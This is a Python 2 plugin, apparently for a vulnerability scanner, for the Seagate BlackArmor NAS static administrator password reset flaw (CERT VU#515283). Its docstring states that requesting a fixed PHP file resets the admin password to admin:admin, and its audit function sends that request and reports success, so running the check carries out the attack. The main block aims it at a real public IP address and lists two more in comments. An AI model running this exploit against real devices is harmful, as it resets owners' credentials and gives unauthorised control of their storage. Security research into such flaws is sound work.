#!/usr/bin/env python
# coding: UTF-8

'''
author: yichin
name: Seagate BlackArmor device static administrator password reset vulnerability
refer: http://www.kb.cert.org/vuls/id/515283
description:
    The Seagate BlackArmor network attached storage device contains a static administrator password reset vulnerability.
    访问 http://foobar/d41d8cd98f00b204e9800998ecf8427e.php 管理员密码将被重置为admin:admin
'''

import re
import urlparse


def assign(service, arg):
    if service == 'seagate_nas':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    payload = arg + 'd41d8cd98f00b204e9800998ecf8427e.php'
    code, head, res, err, _ = curl.curl2(payload)
    if code == 200 and '<h1><strong>OK!</strong></h1>' in res:
        security_hole('administrator password reset vulnerability: ' + payload)
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('seagate_nas','http://220.128.129.49:8080/')[1])
    # audit(assign('seagate_nas','http://220.134.13.73/')[1])
    # audit(assign('seagate_nas','http://219.90.161.126/')[1])